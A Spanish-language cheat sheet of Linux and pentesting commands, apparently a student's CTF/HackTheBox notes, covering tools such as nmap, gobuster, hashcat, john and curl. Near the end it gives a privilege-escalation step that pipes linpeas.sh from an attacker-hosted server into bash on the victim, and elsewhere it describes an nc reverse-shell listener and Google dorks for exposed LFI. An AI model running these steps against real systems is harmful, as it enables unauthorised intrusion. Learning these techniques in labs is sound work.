# Comandos generales

| **Comandos**  | Función | + detalles | argumentos opcionales |
| --- | --- | --- | --- |
| $(<comando>) | se ejecuta primero lo que este entre paréntesis y la salida es lo que pasa como parámetro para el comando de fuera del paréntesis |  |  |
| ; | incluso si el primer comando falla, el segundo se ejecuta. | Separa **varios comandos que se ejecutan uno tras otro**, independientemente del resultado del anterior |  |
| | | Send the output from the first command to the second | Conecta la salida de un comando a la entrada del siguiente. | `xargs` la salida del primer argumento se pone como parámetro en el segundo |
| >/>> | Output redirect | Use > to overwrite a file, and >> to append to the end |  |
| —help | ayuda con argumentos de un comando |  |  |
| && | Run the second command if the first was successful |  |  |
| || | Si comando1 falla, entonces se ejecuta comando 2. |  |  |
| 7z | descomprimir archivos | OJO a veces unzip funciona mejor con archivos ocultos que 7z | `e` <nombre_archivo> “<ruta exactata dnd se encuentra lo que quieres descomprimir>” extrae cualquier cosa dentro de un archivo rar, incluso si `x` no funciona. `x` descomprime el archivo. `l -slt`  lista las cosas que hay dentro del archivo comprimido |
| alias | para crear o mirar alias para comandos localmente |  | `\<alias\>="comando a ejecutar"`  esto lo cambia localmente, si quieres que funcione para cualquier shell tienes que ir al fichero `.zshrc` |
| binwalk | extraer información de un archivo |  |  |
| cat | obtener info de un fichero | jpg, texto, e-mail.. todo lo que no sea dir | `./\<nombre_raro\>` `./--spaces\\ in\\ this\\ filename--` para abrir archivos con espacios poner \ delante de cada espacio |
| cd | moverte de un dir a otro | .. para irte al anterior o ./ para moverte al siguiente, cd para ir al main | ./--SecretFile--.txt nuevo_nombre.txt |
| cewl | crea diccionarios personalizados basados en webs |  | `-w` fichero de salida `-d` la profundidad |
| checksec | mirar que vuln potenciales de un binario |  | te da info sobre si el canario está activado, PIE,…etc |
| chmod | cambiar permisos de un fichero | o(owner)  r(read) w(write) x(execute) | Se el da permisos al owner, luego al group y luego a otros. Cada permiso es una potencia de 2, p. ej: un 7 sería dar permisos rwx. Añadir `+` <letra> que sea para añadir permisos. `u+` para cambiar permisos el usuario que lo ha creado `-` quitar permisos |
| cp | copia un directorio o un fichero |  |  |
| curl | hacer peticiones web | [https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status) | `-s` evita que te muestre el proceso de conexión, `X` #te indica el método que quieres utilizar, si quieres poner bonito el formato añadir `| jq`  , `-v` para ver la respuesta del server ,`—cookie`     te permite poner la cookie que tu quieras  , `—header`    te permite cambiar el tipo de file que utilices, p ej: “Content-Type: application/json” , `--data` '{"email":"test@2million.htb"}' para incluir parámetros que te pida la API`-I` sends a HEAD request (as will see in the next section), while `-i` sends any request we specify and prints the headers as well. |
| cupp | diccionarios personalizados |  | `-i` modo interactivo para introducir datos `leetmode` si intercambia y prueba letras con números `-w` NO combinar con `-i` , hace cambios sobre una wordlist: `leetmode` , caractéres especiales, juntar palabras, números random al final… |
| dirb | ataque de diccionario a una web | dirbuster parecido a gobuster |  |
| dig | como un nslookup pero más potente |  |  |
| docker | levantar mini máquinas virtuales |  | `exec -it \<id\> \\bin\\bash` conectarte a un contenedor docker `docker ps`  ver la id de los contenedores `docker-compose build` tienes que estar en el mismo dir que el .yml y construye el contenedor `docker-compose up` levanta el contenedor y permite acceder a el |
| echo | replicar texto |  | `"\<IP\> \<dominio sin HTTP/[HTTPS://\](HTTPS://\)>" \| sudo tee -a /etc/hosts`  |
| echo " " | sudo tee -a | escribir en un archivo |  | /etc/hosts              es donde está normalmente el archivo host |
| exiftool | muestra metadatos no típicos y los agrupa por tipo |  | `nombre.jpg -u -a -g1` |
| fcrackzip | para crear un archivo zip y forzarlo |  |  |
| file | para saber con que tipo de archivo estás trabajando |  | `-- ./\*` para mirar el tipo de archivo de un directorio entero, si quieres filtrar por algún nombre en específico `-- ./\<nombre\>\*` |
| find | buscar ficheros y directorios del sistema | tienes que estar dentro del propio directorio para encontrarlo [https://man7.org/linux/man-pages/man1/find.1.html](https://man7.org/linux/man-pages/man1/find.1.html) |  `-type d -not -empty`  ver carpetas no vacías de un directorio `-name "\<nombre_raro\>"` para buscar nombres en específico `-type f` → sólo ficheros regulares.`-size 1033c` → tamaño exactamente **1033 bytes** (`c` = bytes).`! -executable` → que **no** sea ejecutable. `/\*` enumera todos los archivos en un dir `2\>/dev/null` para limpiar la salida de permission denied `-user` especifica el usuario que es propietario `-group` `-name *<string a buscar>*` para no tener que mirar exactamente algo, sino coincidencias |
| gcc | creas el ejecutable para un archivo en linux | es independiente al lenguaje original de programación | `-O` e indicas el ejecutable para compilarlo `-g` pones todo para el debuggin, nombre de las funciones, variables… `-s` para no guardar ningún símbolo `-Onº` cuanto quieres que te optimice algo |
| get | extraer un archivo de un directorio |  |  |
| git clone | para instalar lo que sea de un repositorio de github |  | <url> |
| gobuster | general para atacar webs | mirar el servidor q corre a veces no están los directorios específicos en la wordlist y se trabaja más eficazmente | `vhost -vv -k --append-domain -u` [https://futurevera.thm/](https://futurevera.thm/)`\<URL\> -w /usr/share/wordlists/dirb/common.txt -o sub-gob2 \| grep Found`  `-w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt` #mirar subdominios web , es lo que se pone antes de loquesea.htb  `dir --url` [http://10.129.1.15/](http://10.129.1.15/) `--wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` #mirar diferentes directorios    `-H "Cookie: "` añadir una cookie    `x php,html` tells Gobuster to append `.php` and `.html` extensions to each word in the wordlist. |
| grep | buscar un texto específico | no es necesario ejecutar cat previamente | `-RIn` # Buscar texto "flag" dentro de ficheros (recursivo, muestra nombre y línea) `"<texto a buscar>" <nombre del archivo>` |
| hashcat | romper hashes , te tienes que quedar esperando aunque te diga exhausted o te salgan diferentes opciones, todavía está corriendo por detrás | [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier) para identificar el tipo de hash que tenemos [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) para ver el modo que queremos [https://hashcat.net/wiki/doku.php?id=rule_based_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) para mirar las reglas | `-a 3 -m 1400 -O` `-O` es el modo de alto rendimiento, con `-a 0` se hacen ataques con diccionario, el `-m` se utiliza para escoger el tipo de hash a romper.  El argumento siempre va a ser: `-a nº -m nº \<archivo txt con el hash/hash\> 'mascara?a?d'`  la máscara es si te dan alguna pista de como debería salir el hash `?a/?d` significa que después de esa palabra podría ir una letra cualquiera `a` o un nº `d` , para crear tu propia máscara `-1 '?x?x'` y combinas varios modos , las reglas sirven para modificar diccionarios/datos de entrada con `-r`  `--show` enseña los hashes crackeados |
| ifconfig | para ver ip de una máquina |  |  |
| john | crackear hashes | `zip2john` sacar hash de un zip `pdf2john` sacar hash de un pdf `office2john` sacar hash de un office | [`flag.zip](http://flag.zip) > hash.txt` para sacar el hash o lo que sea en hash.txt`w=/usr/share/wordlist/rockyou.txt hash.txt` especificas una wordlist`john --show hash.tx`  |
| ls | ver que hay dentro de un directorio | ll | `-lshA` para ver permisos, ficheros ocultos acciones, extensiones |
| man | manual de un comando |  | <COMANDO> |
| mkdir | crear directorios |  |  |
| msfvenom | reverse shell |  |  |
| mv | cambiar nombre a un archivo o moverlo a otro dir | si te aparece comando o cosas raras: '' | nombredelarchivo directorionuevo/ |
| nano | editor de texto |  |  |
| nc | usado para reverse shell | Dejas escuchando en el host un puerto concreto y esperas que la máq víctima caiga en la trampa y te de acceso shell | `-lvnp` <puerto> |
| nikto | ver vulnerabilidades de una página web |  |  |
| nmap | búsqueda de vulnerabilidades | que puerto está abierto y que SO está utilizando. | `-p- --min-rate 1000 -sV -vvv -T5 -Pn` , `--min…` y `-T\<nº\>` para controlar el tiempo que dejas entre que envías un paquete y el siguiente , `-p-`: para buscar en todos los puertos, `-o allPorts.text` : exporta el resultado de nmap a un fichero q tú le digas, `-sV` para saber la versión y escanear los servicios, `-sC` para correr un script malicioso, `-vvv` para ver lo que está haciendo nmap, `-sU` para escanear UDP (por defecto hace TCP) |
| nslookup | consultas DNS |  | `-type=PTR` averiguas el dominio dada una ip, esto sirve para **consultar el registro PTR (reverse DNS)**, es decir, intentar obtener el **nombre de dominio asociado a una dirección IP**. En este caso, estás preguntando por la IP `128.238.29.22` (el orden se invierte en las consultas de tipo PTR). `NXDOMAIN` significa literalmente **"Non-Existent Domain"** → “el dominio no existe” |
| pdfinfo | extraer información de un archivo |  |  |
| ping | comprueba si una dirección IP concreta responda a mensajes enviados desde nuestra máquina | saber si tenemos una conexión segura con el equipo que estamos atacando | IP del ordenador a atacar `-c` indica el numero de pings que quieres tener |
| pwd | en q directorio estás | print working directory |  |
| pwndbg | para analizar un binario dinámicamente |  | `b <nombre_funciones>` pones un breakpoint en una función `finish` termina la ejecución de la función que estás corriendo `n` para ir corriendo una a una las funciones `c` continuar la ejecución `q` salir |
| responder | Si yo en windows en una red local por un servicio y responder está activo , le dice que es el y que se conecte a él |  |  |
| rm | eliminar un fichero | dir para directorios | -r para quitar además todo lo de dentro |
| scp | copiar ficheros de una máquina a otra |  |  |
| ssh | abrir una conexión remota de una máquina a otra |  | user@ip (ip es la ip a la que queremos llegar) |
| steghide embed | integrar info dentro de otro archivo |  |  |
| string | devuelve todas las cadenas de texto imprimibles |  |  |
| sudo | te deja cambiar el usuario |  | `apt -get install`  para instalar algo, `su` para ser superadmin (también sirve como comando si quieres ser user), `-V` para ver la versión que utiliza de sudo, útil para explotar vulnerabilidades |
| touch | crear archivos |  |  |
| unzip | descomprimir archivos |  | `-- "\<nombre del archivo\>"` extraer un archivo concreto de un zip |
| vi | editor de texto |  |  |
| vol | analizar volcados de memorias de ram |  | `-f \<archivo\> PLUGIN` cmdline , hashdump , [windows.info](http://windows.info) |
| wc | para contar palabras |  | `-l` si solo quieres contar líneas |
| which | ver ruta completa a un archivo |  |  |
| xxd | extraer información de un archivo e identifican su contenido | magic bytes para editarlos comando `hexeditor` | `-p` imprime el volcado hexadecimal en formato plano |
| zsteg | mirar los less significant bytes de una imagen y pasar a texto |  |  |
- [www.revshells.com](http://www.revshells.com) → como metaxploit pero en servicio online
- `/usr/share/wordlists`
- `/dev/null` es un agujero negro, lo que envíes ahí desaparece
- `2` los códigos de error suelen ser de tipo 2
- en parrot para abrir una app no hace falta el comando ‘open’
- En bash en los bucles los `;`  son como un salto de línea
- `.` indica que un fichero está oculto o que se oculte
- en `\$PATH` los `:` significan un nuevo path
- `.zshrc` para modificar cosas que ejecutar al abrir una shell, como alias
- watchtowerlabs → web sobre vuln modernas en ciber

Escalar privilegios

1. desde la máquina atacante
- levantas un servidor http:  sudo python3 -m http.server 8000
1. te conectas a la shell de la víctima
- pones: curl [http://tu_ip_maquina_atacante:puerto_seleccionado/linpeas.sh](http://tu_ip_maquina_atacante:puerto_seleccionado/linpeas.sh) | bash
- “Index of” inurl: → busca LFI expuesto desde google
- robots.txt → mirar subdominios que no quieren que estén indexados
- org:”” → servicios expuestos en iternet
- POC → proof of concept , es para buscar repositorios github con el .py que exploten directamente el CVE
